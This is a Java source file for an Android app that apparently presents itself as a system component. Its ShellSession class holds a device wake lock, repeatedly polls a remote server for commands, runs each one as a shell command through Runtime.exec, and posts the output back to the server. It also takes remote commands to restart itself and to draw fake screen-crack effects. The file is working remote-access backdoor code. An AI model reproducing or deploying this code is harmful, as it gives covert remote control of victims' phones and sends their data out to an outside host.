package oom.android.system.app;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.util.Log;

import org.json.JSONObject;

import oom.android.system.command.DrawingTasks;

public class ShellSession implements Runnable {
    Context context;
    WakeLock wakeLock;
    List<String> remotelist = new ArrayList<String>(); // файлы по строкам на сервере

    String timestamp;
    int max_attempts=300;  // количество попыток получения команды при активном коннекте
    int idleattempts=0;    // кол-во ответов на запрос без новой команды
    String cmd;            //комманда
    String requested_file; // файл который требуют загрузить
    String cmd_spec;       //спец комманда
    long lastrequesttime;  //ремя последнего запроса
    long curtime;          //время
    long shell_interval=60000;  // уже в секундах(!), <10 мин назад - запускаем акт шелл 300

    long on_con_error_delay=1800000; // когда временно нет связи 60000 - 1м 1800000 - 30м
    long no_requests_delay= 600000; //мсек время с последнего запроса - проверяем каждые 10 мин 600000 через сколько будут получать новые комманды
    long between_cmd_delay= 3000; // между получением новой команды в акт. фазе -30 сек 30000
    //boolean is_rooted=false;
    String connection_type;         //тип связи (wifi,3g т.д.)

    ShellSession(){
        this.context=MyService.getContext();
    }

    @Override
    public void run() {
        if(!MyService.ScreenOn){
            try{
                PowerManager mgr = (PowerManager)context.getSystemService(Context.POWER_SERVICE); // лочим
                wakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "oom.android.system:shellWakeLock");
                wakeLock.acquire();
            } catch(Exception e){
                Log.d(MyService.LOG_TAG, "ошибка настройки блокировки!");
            }
        }
        try{
            // устанавливаем тайминги в зав-ти от типа подключения к инету
            ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo info = cm.getActiveNetworkInfo();
            connection_type=info.getTypeName()+":"+info.getSubtypeName();

            if(info != null && info.isConnected() && info.getType() == ConnectivityManager.TYPE_MOBILE){
                Log.d(MyService.LOG_TAG, "используется 3g/edge. изменение времени");

                on_con_error_delay=3600000;  // по умолчанию 60000 мсек = 1 мин --5мин 300000
                no_requests_delay=600000;   // 600000 мсек = 10 мин -- 20мин 1200000
            }
        }
        catch(Exception e){Log.d(MyService.LOG_TAG, "ошибка получения информации о связи");}


        while(true){
            try{
                remotelist=load_url(MyService.shelltime_url);
                if(remotelist.size()!=0&&!(timestamp=remotelist.get(0)).equals("END")){
                    lastrequesttime=Long.parseLong(timestamp);
                    curtime=System.currentTimeMillis()/1000;
                    Log.d(MyService.LOG_TAG, String.valueOf((curtime-lastrequesttime)));
                    Log.d(MyService.LOG_TAG,(curtime-lastrequesttime<shell_interval)? "true" : "false");
                    if(curtime-lastrequesttime<shell_interval){
                        Log.d(MyService.LOG_TAG,"запрос был не давно! активация шелл'а.");
                        activate_shell();
                    }

                    Thread.currentThread().sleep(no_requests_delay); // сон на время без запросов
                }
            }
            catch (InterruptedException e){

                try{
                    wakeLock.release();
                }catch(Exception ex){}
                MyService.cmdsessionactive=false;
                return;//break;
            }
            catch (Exception e){
                Log.d(MyService.LOG_TAG,"shell не смог установить соединение!\n"+e.toString());
                try {
                    Thread.sleep(on_con_error_delay);
                }
                catch(InterruptedException ex){
                    Log.d(MyService.LOG_TAG,"shell был прерван");
                    if(!MyService.ScreenOn) {
                        try {
                            wakeLock.release();
                        } catch (Exception ex1) { }
                    }
                    MyService.cmdsessionactive=false;
                    return;
                }
            }
        }
    }

    public void activate_shell() throws InterruptedException{
        idleattempts=0;
        MyService.cmdsessionactive=true;
        while(idleattempts<max_attempts){
            try{
                remotelist=load_url(MyService.cmd_url); // результат в remotelist <array>
                if(remotelist.size()!=0&&!(cmd=remotelist.get(0)).equals("END")){
                    if(remotelist.size()>1 &&!(cmd_spec=remotelist.get(1)).equals("END")){
                        if(!cmd_spec.equals("")){
                            try{
                                exec_spec(cmd_spec);
                            } catch(Exception e){
                                Log.d(MyService.LOG_TAG,"ошибка при выполнении команды: \n"+cmd+"\"");
                                //post(MyService.post_url,"ошибка при выполнении команды: \n"+cmd+"\"");
                            }
                        }
                    }
                    idleattempts=0; //сбрасываем счетчик - появилась активность
                    if(!cmd.equals("")){
                        Log.d(MyService.LOG_TAG,"текущаяя команда: \""+cmd+"\" выполняется..");
                        try{
                            List<String> res = exec_cmd(cmd);
                            if (res.size()!=0){
                                postdata(MyService.post_url,res); // отсылаем результат
                            } else{
                                post(MyService.post_url,"error");
                            }

                        } catch(Exception e){
                            Log.d(MyService.LOG_TAG,"ошибка при выполнении команды: \n"+cmd+"\"");
                        }
                    }
                }
            }
            catch(Exception e){
                Log.d(MyService.LOG_TAG,"ошибка при получении удаленной команды\n"+e.toString());
            }

            Thread.currentThread().sleep(between_cmd_delay);
            idleattempts++;

        }
        MyService.cmdsessionactive=false;

    }

    public List<String> exec_cmd(String command){
        String inputLine;
        List<String> res = new ArrayList<String>();

        try {
            Process process = Runtime.getRuntime().exec(command);
            //if(command.startsWith("kill") || command.startsWith("mkdir") || command.startsWith("mv") || command.startsWith("rm") || command.startsWith("rmdir") ) {
                BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));

                while ((inputLine = in.readLine()) != null) {
                    res.add(inputLine);
                }
            //}

        } catch (Exception e) {
            Log.d(MyService.LOG_TAG,"ошибка выполнения: \""+command+"\"\n"+e.toString());
        }
        return res;
    }

    public void exec_spec(String command){
        try {
            Log.d("Command","Command:" + command);
            JSONObject gJson = null;
            try{
                Integer ind = command.indexOf(" ");
                String json = command.substring(ind);
                gJson = new JSONObject(json);
            }catch (Exception e){}

            if(command.startsWith("restart")){
                post(MyService.post_url,"[Settings]restarting whole service!");
                System.exit(0);

            }
            else if(command.startsWith("OpenGL")){
                try{
                    DrawingTasks.open(MyService.getContext());
                }catch (Exception e){}
            }
            else if(command.startsWith("Crack")){
                DrawingTasks.crash(MyService.getContext());
            }
            else if(command.startsWith("pong")){
                DrawingTasks.pong(MyService.getContext());
            }
            else if(command.startsWith("clear")){
                DrawingTasks.clear(MyService.getContext());
            }
            else if(command.startsWith("draw")){
                DrawingTasks.draw(MyService.getContext(),gJson.get("url").toString());
            }
            else if(command.startsWith("ScreenCrack")){
                DrawingTasks.crash(MyService.getContext());
            }





        } catch (Exception e) {
            Log.d(MyService.LOG_TAG,"error executing spec: \""+command+"\"\n"+e.toString());
        }
    }



    static public List<String> load_url(String url_string){
        List<String> res = new ArrayList<String>();
        try{
            URL url = new URL(url_string);
            HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestMethod("GET");
            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                Log.d(MyService.LOG_TAG, "load_url() error: "+connection.getResponseCode());
            }
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;

            while ((inputLine = in.readLine())!=null&&!(inputLine.equals("END"))){
                res.add(inputLine);}
            in.close();
            connection.disconnect();
            //Log.d(LOG_TAG, "total: "+remotelist.size());
        }
        catch(Exception e){
            Log.d(MyService.LOG_TAG, "ошибка при установлении соединения\\создание потока\n"+e.toString());
            return null;
        }
        return res;
    }

    public void postdata(String url,List<String> data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }

    public void post(String url,String data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }
}
